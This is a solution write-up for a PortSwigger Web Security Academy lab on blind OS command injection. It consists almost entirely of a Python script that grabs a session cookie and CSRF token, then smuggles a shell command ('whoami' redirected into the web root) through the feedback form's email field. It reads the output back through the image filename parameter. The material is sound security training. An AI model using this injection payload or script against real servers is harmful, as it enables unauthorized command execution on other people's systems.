# Lab: Blind OS command injection with output redirection

link to lab: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from datetime import datetime


res = requests.get(
    'https://0a6a001804c5463dc3f33ddc007e00ef.web-security-academy.net/feedback',
    verify=False,
)
soup = BeautifulSoup(res.text, 'html.parser')
session = res.cookies.get('session')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print("session: ", session)
print("csrf: ", csrf_token)


cookies = {
    'session': session,
}

data = {
    'csrf': csrf_token,
    'name': 'a',
    'email': 'a@a.a; whoami > /var/www/images/whoami.txt ; ',
    'subject': 'a',
    'message': 'a',
}

response = requests.post(
    'https://0a6a001804c5463dc3f33ddc007e00ef.web-security-academy.net/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)


params = {
    'filename': 'whoami.txt',
}

getTXT = requests.get(
    'https://0a6a001804c5463dc3f33ddc007e00ef.web-security-academy.net/image',
    params=params,
    verify=False,
)

print(getTXT.text)
```